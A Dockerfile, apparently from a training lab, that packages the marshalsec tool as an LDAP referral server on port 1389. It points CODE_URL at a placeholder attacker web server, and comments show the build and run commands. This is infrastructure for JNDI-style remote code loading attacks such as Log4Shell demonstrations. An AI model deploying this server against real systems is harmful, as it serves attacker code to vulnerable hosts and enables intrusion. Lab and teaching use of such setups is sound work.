
FROM ubuntu:20.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update

RUN apt-get -y install aptitude vim curl wget gnupg  openjdk-11-jdk

RUN mkdir -p /usr/local/software

WORKDIR /usr/local/software

COPY target/marshalsec-0.0.3-SNAPSHOT-all.jar /usr/local/software/app.jar

COPY entrypoint.sh /usr/local/software/entrypoint.sh

RUN chmod -R 0775 /usr/local/software/entrypoint.sh

ENV SERVER_PORT=1389
ENV CODE_URL=http://attackerwebserver/#SampleVector

ENTRYPOINT ["/usr/local/software/entrypoint.sh"]

# docker build -t izzyacademy/marshallsec:1.0 .

# docker run --name marshallsec -p 1389:1389 -e "SERVER_PORT=1389" -e "CODE_URL=http://attackerwebserver/#SampleVector" izzyacademy/marshallsec:1.0

# docker exec -it marshallsec /bin/bash


